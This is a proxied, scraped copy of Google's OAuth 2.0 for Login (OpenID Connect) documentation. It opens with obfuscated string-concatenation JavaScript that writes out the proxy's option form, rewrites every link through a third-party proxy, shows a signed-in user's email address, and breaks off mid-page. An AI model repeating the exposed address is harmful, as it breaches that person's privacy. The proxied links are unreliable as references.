nkhorfl + 'abe' + aoytav + 'l>' + fsclkfk + '<in' + ttzkibsq + 'pu' + nkhorfl + 't t' + ktgayekt + 'yp' + fsclkfk + 'e="' + ppceqiu + 'c' + vwagkisdcr + 'he' + lwgvbaloi + 'ckb' + ttzkibsq + 'ox' + lwgvbaloi + '"' + ingsgntfr + ' n' + lwgvbaloi + 'ame' + hiefsp + '=' + ingsgntfr + '"Wd' + qnhaelnro + 'l' + hiefsp + 'Yo' + zymdlz + 'c' + ingsgntfr + 'v0' + xjvdzkf + 't' + lwgvbaloi + 'Zg' + ppceqiu + '08' + ppceqiu + 'E8' + zymdlz + 'M' + qnhaelnro + 'u' + nkhorfl + 'E' + aoytav + 'qS' + cphjlyryf + 'j' + zymdlz + 'Q[' + vwagkisdcr + 'st' + jenmfbl + 'rip' + oafqbdboje + '_' + lwgvbaloi + 'm' + cphjlyryf + 'et' + nkhorfl + 'a]"' + nkhorfl + ' ch' + bgxwcxdngw + 'e' + wtkhnnw + 'c' + hiefsp + 'k' + fsclkfk + 'e' + ppceqiu + 'd=' + aoytav + '"' + ktgayekt + 'ch' + vwagkisdcr + 'ec' + ktgayekt + 'ke' + hiefsp + 'd"' + jenmfbl + ' /' + ingsgntfr + '> S' + fsclkfk + 'tr' + hiefsp + 'i' + wtkhnnw + 'p M' + qnhaelnro + 'e' + ttzkibsq + 'ta' + hiefsp + '</' + nkhorfl + 'l' + xjvdzkf + 'ab' + fsclkfk + 'el' + hiefsp + '> <' + hiefsp + 'lab' + ktgayekt + 'e' + jenmfbl + 'l' + ingsgntfr + '><' + jenmfbl + 'i' + cphjlyryf + 'np' + aoytav + 'u' + lwgvbaloi + 't' + ktgayekt + ' ' + witngzxmra + 't' + hiefsp + 'yp' + ingsgntfr + 'e' + fsclkfk + '=' + xjvdzkf + '"ch' + witngzxmra + 'ec' + xjvdzkf + 'kbo' + cphjlyryf + 'x"' + vwagkisdcr + ' na' + vwagkisdcr + 'm' + ttzkibsq + 'e="' + oafqbdboje + 'Wdl' + ttzkibsq + 'Yoc' + aoytav + 'v0t' + witngzxmra + 'Zg' + xjvdzkf + '08E' + zymdlz + '8M' + qnhaelnro + 'u' + qnhaelnro + 'E' + oafqbdboje + 'q' + wtkhnnw + 'SjQ' + ppceqiu + '[st' + hiefsp + 'rip' + aoytav + '_ti' + nkhorfl + 't' + nkhorfl + 'le' + sourxic + ']' + ktgayekt + '" ' + hiefsp + 'ch' + hiefsp + 'ec' + witngzxmra + 'ke' + hiefsp + 'd="' + ttzkibsq + 'che' + ingsgntfr + 'cke' + witngzxmra + 'd' + ingsgntfr + '" /' + bgxwcxdngw + '>' + ttzkibsq + ' St' + aoytav + 'r' + oafqbdboje + 'i' + nkhorfl + 'p T' + ingsgntfr + 'i' + qnhaelnro + 'tle' + witngzxmra + '</' + oafqbdboje + 'l' + qnhaelnro + 'ab' + ttzkibsq + 'el' + zymdlz + '> ' + ppceqiu + '<l' + aoytav + 'ab' + zymdlz + 'el>' + qnhaelnro + '<' + jenmfbl + 'in' + fsclkfk + 'put' + vwagkisdcr + ' ' + lwgvbaloi + 'ty' + jenmfbl + 'pe' + xjvdzkf + '=' + nkhorfl + '"ch' + zymdlz + 'eck' + ktgayekt + 'box' + nkhorfl + '" ' + cphjlyryf + 'nam' + cphjlyryf + 'e=' + xjvdzkf + '"' + nkhorfl + 'Wdl' + aoytav + 'Y' + wtkhnnw + 'oc' + oafqbdboje + 'v0t' + nkhorfl + 'Z' + witngzxmra + 'g0' + nkhorfl + '8E' + aoytav + '8' + qnhaelnro + 'Mu' + zymdlz + 'E' + aoytav + 'qS' + hiefsp + 'jQ[' + witngzxmra + 'ses' + qnhaelnro + 'sio' + ttzkibsq + 'n_' + xjvdzkf + 'co' + cphjlyryf + 'oki' + aoytav + 'es' + sourxic + ']" ' + bgxwcxdngw + 'che' + fsclkfk + 'cke' + qnhaelnro + 'd' + qnhaelnro + '=' + hiefsp + '"' + fsclkfk + 'c' + cphjlyryf + 'h' + ingsgntfr + 'eck' + bgxwcxdngw + 'ed"' + jenmfbl + ' />' + aoytav + ' ' + wtkhnnw + 'S' + ttzkibsq + 'ess' + nkhorfl + 'i' + sourxic + 'on' + xjvdzkf + ' C' + ktgayekt + 'oo' + fsclkfk + 'k' + oafqbdboje + 'i' + fsclkfk + 'es<' + wtkhnnw + '/l' + nkhorfl + 'ab' + lwgvbaloi + 'e' + qnhaelnro + 'l>' + nkhorfl + ' <' + ttzkibsq + '/' + aoytav + 'for' + oafqbdboje + 'm><' + qnhaelnro + '/' + nkhorfl + 'di' + wtkhnnw + 'v>' + ingsgntfr + "\n";
document.write(tcxkkawa);
</script><div style="width:100%;margin:0;text-align:center;border-bottom:1px solid #725554;color:#000000;background-color:#F2FDF3;font-size:12px;font-weight:bold;font-family:Bitstream Vera Sans,arial,sans-serif;padding:4px;">
<script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
</script><script src="OAuth2Login_files/ga.js" type="text/javascript"></script>
<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6195535-63");
pageTracker._trackPageview();
} catch(err) {}</script>
<script src="OAuth2Login_files/loader-counter.js"></script>
<form method="post" action="http://www.junkpilot.com/nppxjoj.php"> <label for="____8fzyhIAhMX1GihyIsVh7oQ"><a href="https://developers.google.com/accounts/docs/OAuth2Login">Address</a>:</label> <input id="____8fzyhIAhMX1GihyIsVh7oQ" size="80" name="8fzyhIAhMX1GihyIsVh7oQ" value="https://developers.google.com/accounts/docs/OAuth2Login" type="text"> <input name="go" value="Go" type="submit"> [go: <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUbzRJ7wdTb8dN98SGdGqt6nCKPz%2F2BA3SBWkDxRTm3Xd">up one dir</a>, <a href="http://www.junkpilot.com/">main page</a>]<br><hr><label><input name="WdlYocv0tZg08E8MuEqSjQ[include_form]" checked="checked" type="checkbox"> Include Form</label> <label><input name="WdlYocv0tZg08E8MuEqSjQ[remove_scripts]" checked="checked" type="checkbox"> Remove Scripts</label> <label><input name="WdlYocv0tZg08E8MuEqSjQ[accept_cookies]" checked="checked" type="checkbox"> Accept Cookies</label> <label><input name="WdlYocv0tZg08E8MuEqSjQ[show_images]" checked="checked" type="checkbox"> Show Images</label> <label><input name="WdlYocv0tZg08E8MuEqSjQ[show_referer]" checked="checked" type="checkbox"> Show Referer</label> <label><input name="WdlYocv0tZg08E8MuEqSjQ[rotate13]" checked="checked" type="checkbox"> Rotate13</label> <label><input name="WdlYocv0tZg08E8MuEqSjQ[base64_encode]" checked="checked" type="checkbox"> Base64</label> <label><input name="WdlYocv0tZg08E8MuEqSjQ[strip_meta]" checked="checked" type="checkbox"> Strip Meta</label> <label><input name="WdlYocv0tZg08E8MuEqSjQ[strip_title]" checked="checked" type="checkbox"> Strip Title</label> <label><input name="WdlYocv0tZg08E8MuEqSjQ[session_cookies]" checked="checked" type="checkbox"> Session Cookies</label> </form></div>


  <div class="maia-max">

    
    <div id="sandbar">
      
        
          





<div id="maia-header" class="maia-header">
  <header id="googlebar">
    <div id="logo-wrapper">
      <a id="logo" href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUf5xjFBwwEoca%2FyPPZTvEj4%3D">
        <img src="OAuth2Login_files/nppxjoj.svg" alt="Google">
      </a>
      
    </div>

    <div id="search-wrapper" class="head-sec search-wrapper2">
      <form class="search" action="" method="GET" id="top-search"><input name="____pgfa" value="qA0oL3D513Rhj1%2BjRJtjUcptr1vTPpubc4Xf%2BIVlWbsCtiR2gTsZlA8LjfcvXxFd" type="hidden">
        <div id="searchbox" class="searchbox">
           
           <input name="q" class="q" id="q" placeholder="Search" autocomplete="off" type="text">
        </div>
        <button id="search-button" class="button button-blue big">
          <img src="OAuth2Login_files/nppxjoj_002.png" alt="Search">
        </button>
        
          <input name="p" id="search_project" value="/accounts" data-project-name="Google Accounts Authentication and Authorization" data-project-path="/accounts" data-query-match="" type="hidden">
        
        


  
  <input id="suggest-category-label-2" value="Pages in Google Accounts Authentication and Authorization" type="hidden">
  
  <input id="suggest-category-label-3" value="Reference in Google Accounts Authentication and Authorization" type="hidden">


<input id="suggest-category-label-1" value="Products" type="hidden">

<input id="suggest-all-results-label" value="See all results for" type="hidden">

      </form>
    </div>

    <div id="social-wrapper" class="social">
      
      <span class="signed-in">
        <div>
          <a class="" email="" right="" href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=exZ01bCWk8%2B8Vr3JLnMEPR6UzEUILzR2uixMY266SaM%3D">ahrnazemi@gmail.com</a>
          <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=Gvp8VVOghVr5oGSw50zkMBWQInN2GUKmRKNWFGqYSHkuaE49aZ8jUuoAjRY5w6cNqA0oL3D513Rhj1%2BjRJtjUbzRJ7wdTb8dN98SGdGqt6lMeaLChgjDkbYUlrMEZs5lmNyyDQMKUFL0cTMhmpZ7EBX71opx%2BYJjeA9MkW35h%2BM%3D">Sign out</a>
        </div>
        <img class="avatar right" src="OAuth2Login_files/nppxjoj.jpg">
      </span>
      
    </div>
  </header>
</div>



        
      
    </div><!-- end div.sandbar -->
    

    
    <div id="gc-wrapper" itemscope="" itemtype="http://schema.org/Article">
      
        
          <input class="gc-analytics" value="UA-24532603-1" type="hidden">
        
          <input class="gc-analytics" value="UA-49880327-1" type="hidden">
        
      

       <!-- if site.theme == 'maia' or site.theme == 'maia-cloud' -->
      

<div id="gc-appnav">
  <ol class="breadcrumbs">
    
    <li><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUbepwcqFoFLRyTnK6X%2Fc1c04Evw%2BzrlP9hWlrKLZXLwK">Products</a></li>
    
    <li><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUbzRJ7wdTb8dN98SGdGqt6nCKPz%2F2BA3SBWkDxRTm3Xd">Google Accounts Authentication and Authorization</a></li>
    
  </ol>
</div>



      
      
      
          <div class="maia-aux" id="gc-appbar">

          
          

<h1><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUbzRJ7wdTb8dN98SGdGqt6nCKPz%2F2BA3SBWkDxRTm3Xd">Google Accounts Authentication and Authorization</a></h1>



<div class="plusone-container" style="height:27px">
  <div class="g-plusone" data-href="https://developers.google.com/accounts/docs/OAuth2Login" data-size="medium" data-source="google:developers"></div>
</div>





 

          
        </div>
      
      

      
        
          <div id="gc-main" class="main">
        
        
  
  
      
      
      <div id="gc-sidebar">
        

  



  <nav class="gc-toc"><ul><li class=""><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUbzRJ7wdTb8dN98SGdGqt6nIBsmU%2FkbScuzoWojlRVrD5XvuON6In964hdTv6TM2KA%3D%3D" title="Choosing an Auth Mechanism" data-title="Choosing an Auth Mechanism"><span>Choosing an Auth Mechanism</span></a></li><li class=""><span class="tlw-title" data-title="Authentication">Authentication</span><ul><li class=""><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUbzRJ7wdTb8dN98SGdGqt6lMeaLChgjDkbYUlrMEZs5lDYoyAEfFnSGo%2BfOR9KQGvw%3D%3D" title="OAuth 2.0 for Login (OpenID Connect)" data-title="OAuth 2.0 for Login (OpenID Connect)"><span>OAuth 2.0 for Login (OpenID Connect)</span></a></li><li class=""><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUbzRJ7wdTb8dN98SGdGqt6muKV%2BujHkUWRKQHIDtGqFzGAnqZ32fZYsPfTiXbli7Zg%3D%3D" title="OpenID 2.0 (Migration)" data-title="OpenID 2.0 (Migration)"><span>OpenID 2.0 (Migration)</span></a></li><li class=""><span class="tlw-title" data-title="Older Protocols">Older Protocols</span><ul><li class="deprecated"><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUbzRJ7wdTb8dN98SGdGqt6muKV%2BujHkUWRKQHIDtGqFzNMT3iygU%2FSLySuMKnPG4JQ%3D%3D" title="OpenID 2.0" data-title="OpenID 2.0"><span>OpenID 2.0<sup>Deprecated</sup></span></a></li><li class="deprecated"><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUbzRJ7wdTb8dN98SGdGqt6lMeaLChgjDkbYUlrMEZs5l5gJ54tByFebL0TRxIVC1zw%3D%3D" title="OAuth 2.0 for Login" data-title="OAuth 2.0 for Login"><span>OAuth 2.0 for Login<sup>Deprecated</sup></span></a></li></ul></li></ul></li><li class=""><span class="tlw-title" data-title="API Authorization">API Authorization</span><ul><li class=""><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUbzRJ7wdTb8dN98SGdGqt6lMeaLChgjDkbYUlrMEZs5lBTf4ti6iHdGcs8qZniynKg%3D%3D" title="OAuth 2.0" data-title="OAuth 2.0"><span>OAuth 2.0</span></a><ul><li class=""><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUbzRJ7wdTb8dN98SGdGqt6lMeaLChgjDkbYUlrMEZs5lQUtg0x6pgmqAbiEjf5Iz5A%3D%3D" title="Web Server" data-title="Web Server"><span>Web Server</span></a></li><li class=""><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUbzRJ7wdTb8dN98SGdGqt6lMeaLChgjDkbYUlrMEZs5lrxEA7%2F9Uh%2BCpKMaRCj4m9w%3D%3D" title="Installed Apps" data-title="Installed Apps"><span>Installed Apps</span></a></li><li class=""><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUbzRJ7wdTb8dN98SGdGqt6lMeaLChgjDkbYUlrMEZs5lyarU1zmSaffMbVo9ORJujw%3D%3D" title="Client-side" data-title="Client-side"><span>Client-side</span></a></li><li class=""><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUbzRJ7wdTb8dN98SGdGqt6lMeaLChgjDkbYUlrMEZs5ljhhxIcjJyrK9OYdPliKyOw%3D%3D" title="Devices" data-title="Devices"><span>Devices</span></a></li><li class=""><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUbzRJ7wdTb8dN98SGdGqt6lMeaLChgjDkbYUlrMEZs5l0e%2BvizpUhQKz3t%2F4AnKCBg%3D%3D" title="Service Accounts" data-title="Service Accounts"><span>Service Accounts</span></a></li><li class=""><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUbzRJ7wdTb8dN98SGdGqt6m%2Fywl9tRsVC7HdbG9%2FBMCmfi%2BTPyBWBozPrOJdTFC8Lw%3D%3D" title="Cross-client Identity" data-title="Cross-client Identity"><span>Cross-client Identity</span></a></li></ul></li><li class=""><span class="tlw-title" data-title="Older Protocols">Older Protocols</span><ul><li class="deprecated"><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUbzRJ7wdTb8dN98SGdGqt6lMeaLChgjDkbYUlrMEZs5ld0cCSieFpC5zWpEFHDpolw%3D%3D" title="OAuth 1.0 for Web Apps" data-title="OAuth 1.0 for Web Apps"><span>OAuth 1.0 for Web Apps<sup>Deprecated</sup></span></a></li><li class="deprecated"><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUbzRJ7wdTb8dN98SGdGqt6lMeaLChgjDkbYUlrMEZs5lwutYk1J4QxtBbPRfBOnNVU3Totvvg1NQX8C0A68FuVM%3D" title="OAuth 1.0 for Installed Apps" data-title="OAuth 1.0 for Installed Apps"><span>OAuth 1.0 for Installed Apps<sup>Deprecated</sup></span></a></li><li class="deprecated"><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUbzRJ7wdTb8dN98SGdGqt6lMeaLChgjDkbYUlrMEZs5l42Dz5QGDLuyzVrj384h%2FyA%3D%3D" title="OAuth 1.0 Reference" data-title="OAuth 1.0 Reference"><span>OAuth 1.0 Reference<sup>Deprecated</sup></span></a></li><li class="deprecated"><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUbzRJ7wdTb8dN98SGdGqt6nSiqVK73zP%2F7OVCMymzSmmnIMB0RvP2L2yX8J7j2hBDA%3D%3D" title="AuthSub" data-title="AuthSub"><span>AuthSub<sup>Deprecated</sup></span></a></li><li class="deprecated"><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUbzRJ7wdTb8dN98SGdGqt6nSiqVK73zP%2F7OVCMymzSmmfyX1xM2IVthpnJHFWtW%2BxA%3D%3D" title="ClientLogin" data-title="ClientLogin"><span>ClientLogin<sup>Deprecated</sup></span></a></li></ul></li></ul></li><li class=""><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUbzRJ7wdTb8dN98SGdGqt6lhMcySZ59fpAXkJ4ceoBN1" title="Terms of Service" data-title="Terms of Service"><span>Terms of Service</span></a></li><li class=""><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUbzRJ7wdTb8dN98SGdGqt6ljj2ZwawDFZtoJDKGuMkcP" title="Forum" data-title="Forum"><span>Forum</span></a></li></ul></nav>



      </div>
      

      <div id="gc-content">
        
        <div>
  
          
  
  <h1 itemprop="name" class="page-title">Using OAuth 2.0 for Login (OpenID Connect)</h1>
  
  <div itemprop="articleBody">
  
<section>
  <p>
Google APIs use OAuth 2.0 for both authentication and authorization. This document describes
Google's underlying OAuth 2.0 implementation for authentication, which aligns with the <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=dGyTFdVU2m9zFFZIjubu5hhY1ltZ083Lbc99nkGCLjE%3D">OpenID Connect</a> specification. The documentation found in <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUbzRJ7wdTb8dN98SGdGqt6lMeaLChgjDkbYUlrMEZs5lBTf4ti6iHdGcs8qZniynKg%3D%3D">Using OAuth 2.0 to Access Google APIs</a>
also applies to this service.
If you want to explore this protocol interactively, we recommend the <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUaqbnKl1os9lAS19aWx%2Fk7shhhey2gfV2%2FP5c9zPoqhA">Google OAuth 2.0 Playground</a>. 
To get help on <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=6u4cxRDECU3b1efQZ7ZtzpwkGNFXazG0Z%2FnQKhPNHvMJyl%2BbZvZyAoOzjn0d8ViNcoReqYCOQBcnsUTDxWotJA%3D%3D">Stack Overflow</a>, 
tag your questions with 'google-oauth'.</p>

<div style="float:right; margin:5px 5px 0 0;"><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUWoU%2FZxnh%2FsKsPRUgYjnlug%3D"><img src="OAuth2Login_files/nppxjoj_004.png" alt="Sign-In with Google" width="200"></a></div>
<aside class="note"><b>Note:</b> If you provide a “sign-in with Google”
feature, we recommend using <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUWoU%2FZxnh%2FsKsPRUgYjnlug%3D">Google+ Sign-In</a>. Google+ Sign-In is
built on the OAuth 2.0 and OpenID Connect protocols. It
supports <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUWoU%2FZxnh%2FsKsPRUgYjnluimWl4ESm%2BV3Rl%2FU90DwLp%2F2SkeVrmuisynpYOcUNcS9g%3D%3D">over-the-air installs</a>, social features, and a sign-in widget on
top of standardized OpenID Connect sign-in flows.
Google+ Sign-In works for all users with a Google account, whether or not they have
upgraded to Google+. If you have an OpenID Connect–based solution in place and would like to
switch, see <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUWoU%2FZxnh%2FsKsPRUgYjnlujxcBgJ62J%2BcZ9MsZBi83NCBziqrx4Qw%2BRZeUXqTdG1qA%3D%3D##userinfo">Migrate or update OAuth 2.0 login</a>.</aside>
<aside class="note"><b>Tip:</b> To configure Google+ Sign-In to return profile information
in OpenID Connect format, use the <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUWoU%2FZxnh%2FsKsPRUgYjnluhWp%2FU9PPlP%2Fr1x5Hyq1qRQ##openid"><code>openid</code></a>
scope and get the profile by calling the <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUWoU%2FZxnh%2FsKsPRUgYjnlugucaXXKzVOWpPrajqF%2FckBojEqjcq6EEMrg6Vyz4eDD8%2FHBaWAZYawetH3wcqmH4s%3D"><code>people.getOpenIdConnect</code></a> endpoint.
</aside>
    </section>

<section>
<h2>Contents</h2>
<ol class="toc">
<li><a href="#appsetup">Setting up OAuth 2.0</a>
<ul>
    <li><a href="#getcredentials">Obtain OAuth 2.0 credentials</a>
    </li><li><a href="#setredirecturi">Set a redirect URI</a>
    </li><li><a href="#consentpageexperience">Customize the user consent screen</a>
</li></ul>
</li><li><a href="#accessingtheservice">Accessing the service</a>
</li><li><a href="#authenticatingtheuser">Authenticating the user</a>
    <ul>
    <li><a href="#createxsrftoken">Create an anti-forgery state token</a>
    </li><li><a href="#sendauthrequest">Send an authentication request to Google</a>
    </li><li><a href="#confirmxsrftoken">Confirm anti-forgery state token</a>
    </li><li><a href="#exchangecode">Exchange code for access token and ID token</a>
    </li><li><a href="#obtainuserinfo">Obtain user information from the ID token</a>
    </li><li><a href="#authuser">Authenticate the user</a>
    </li></ul>
</li><li><a href="#advancedtopics">Advanced topics</a>
<ul>
    <li><a href="#offlineaccess">Access to other Google APIs</a>
    </li><li><a href="#refresh-tokens">Refresh tokens</a>
    </li><li><a href="#re-consent">Prompting re-consent</a>
    </li><li><a href="#authenticationuriparameters">Authentication URI parameters</a>
    </li><li><a href="#validatinganidtoken">Validating an ID token</a>
    </li><li><a href="#obtaininguserprofileinformation">Obtaining user profile information</a>
</li></ul>
</li><li><a href="#discovery">Discovery document</a>
</li><li><a href="#libraries">Client libraries</a>
</li><li><a href="#oidc-compliance">OpenID Connect compliance</a>
</li></ol>
    </section>

<section id="registeringyourapp">

    <h2 id="appsetup">Setting up OAuth 2.0</h2>
<p>
Before your application can use Google's OAuth 2.0 authentication system for user login, you must
set up a project in the <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=QLOG3w7JKFpRpNbyDrWR9EsO7IGWc300jOT8FfZGV%2FmXIa1gomT6tSKKRp6XgHv%2F">Google Developers Console</a> to obtain OAuth 2.0 credentials, set a redirect URI, and
  (optionally) customize the branding information that your users see on the user-consent screen.
  You can
  also use the Developers Console to create a service account, enable billing, set up filtering,
  and do other tasks. For more details, see the <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUXAinS3bTOS7LV4QiR%2FeHw3mNLgjZ04mLbgPELWmL6hAdzGcz4rDCIOLscDX83FVAQ%3D%3D">
  Google Developers Console Help</a>.</p>
<h3 id="getcredentials">Obtain OAuth 2.0 credentials</h3>
<p>
You need OAuth 2.0 credentials, including a client ID
  and client secret, to authenticate users and gain access to Google's
APIs.</p>
  

<style>
  body.docs section.expandable-bottom-margin {
    margin-bottom: 1.5em;
  }
  body.docs section.expandable-no-left-margin {
    margin-left: 0;
  }
</style>




<p>To find your project's client ID and client secret, do the following:</p>
<ol>
  

<style>
  body.docs section.expandable-bottom-margin {
    margin-bottom: 1.5em;
  }
  body.docs section.expandable-no-left-margin {
    margin-left: 0;
  }
</style>




  <li>

<style>
  body.docs section.expandable-bottom-margin {
    margin-bottom: 1.5em;
  }
  body.docs section.expandable-no-left-margin {
    margin-left: 0;
  }
</style>




Go to the <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=QLOG3w7JKFpRpNbyDrWR9EsO7IGWc300jOT8FfZGV%2FmXIa1gomT6tSKKRp6XgHv%2F">Google Developers Console</a>.
</li>
  <li>



Select a project, or create a new one.


</li>
  <li>

<style>
  body.docs section.expandable-bottom-margin {
    margin-bottom: 1.5em;
  }
  body.docs section.expandable-no-left-margin {
    margin-left: 0;
  }
</style>






In the sidebar on the left, expand <b>APIs &amp; auth</b>.

Next, click <b>APIs</b>.

  
    
      In the list of APIs, make sure all of the APIs you are using show a status of <b>ON</b>.
    
  

</li>
  <li>

In the sidebar on the left, select <b>Credentials</b>.

</li>

  <li>If you haven't done so already, create your project's OAuth 2.0 credentials by clicking
  <b>Create new Client ID</b>, and providing the information needed to create the credentials.</li>
  <li>Look for the <b>Client ID</b> and <b>Client secret</b> in the table associated with each of
  your credentials.</li>
</ol>

<p>Note that not all types of credentials use both a client ID and client secret and won't be
listed in the table if they are not used.</p>

    <h3 id="setredirecturi">Set a redirect URI</h3>
<p>The redirect URI that you set in the Developers Console determines where Google sends
  responses to your <a href="#sendauthrequest">authentication requests</a>.
  

<style>
  body.docs section.expandable-bottom-margin {
    margin-bottom: 1.5em;
  }
  body.docs section.expandable-no-left-margin {
    margin-left: 0;
  }
</style>




</p><p>To find the redirect URIs for your OAuth 2.0 credentials, do the following:</p>
<ol>
  

<style>
  body.docs section.expandable-bottom-margin {
    margin-bottom: 1.5em;
  }
  body.docs section.expandable-no-left-margin {
    margin-left: 0;
  }
</style>




  <li>

<style>
  body.docs section.expandable-bottom-margin {
    margin-bottom: 1.5em;
  }
  body.docs section.expandable-no-left-margin {
    margin-left: 0;
  }
</style>




Go to the <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=QLOG3w7JKFpRpNbyDrWR9EsO7IGWc300jOT8FfZGV%2FmXIa1gomT6tSKKRp6XgHv%2F">Google Developers Console</a>.
</li>
  <li>



Select a project, or create a new one.


</li>
  <li>

<style>
  body.docs section.expandable-bottom-margin {
    margin-bottom: 1.5em;
  }
  body.docs section.expandable-no-left-margin {
    margin-left: 0;
  }
</style>






In the sidebar on the left, expand <b>APIs &amp; auth</b>.

Next, click <b>APIs</b>.

  
    
      In the list of APIs, make sure all of the APIs you are using show a status of <b>ON</b>.
    
  

</li>
  <li>

In the sidebar on the left, select <b>Credentials</b>.

</li>

  <li>If you haven't done so already, create your OAuth 2.0 credentials by clicking <b>Create new
  Client ID</b>.</li>
  <li>Look for the <b>Redirect URIs</b> row in the appropriate Client ID table.</li>
</ol>

<p>You can modify the list of redirect URIs by clicking <b>Edit settings</b> below the table, or by
deleting and recreating your credential.</p>

<p></p>
<h3 id="consentpageexperience">Customize the user consent screen</h3>
<p>
For your users, the OAuth 2.0 authentication experience includes a consent screen that
describes the information that the user is releasing and the terms that apply. For example, when the user logs in,
  they might be asked to give your app access to their email address and basic account information. You request
access to this information using the <a href="#scope-param"><code>scope</code></a> parameter, which your app
includes in
its <a href="#sendauthrequest">authentication request</a>. You can also use scopes
to request access to other Google APIs. </p>
<p>The user consent screen also presents branding information such as your product name,
  logo, and a homepage URL. You control the branding information in the
Developers Console. </p>


<style>
  body.docs section.expandable-bottom-margin {
    margin-bottom: 1.5em;
  }
  body.docs section.expandable-no-left-margin {
    margin-left: 0;
  }
</style>




<p>To set up your project's consent screen, do the following:</p>
<ol>
  <li>

<style>
  body.docs section.expandable-bottom-margin {
    margin-bottom: 1.5em;
  }
  body.docs section.expandable-no-left-margin {
    margin-left: 0;
  }
</style>




Go to the <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=QLOG3w7JKFpRpNbyDrWR9EsO7IGWc300jOT8FfZGV%2FmXIa1gomT6tSKKRp6XgHv%2F">Google Developers Console</a>.
</li>
  <li>



Select a project, or create a new one.


</li>
  <li>

<style>
  body.docs section.expandable-bottom-margin {
    margin-bottom: 1.5em;
  }
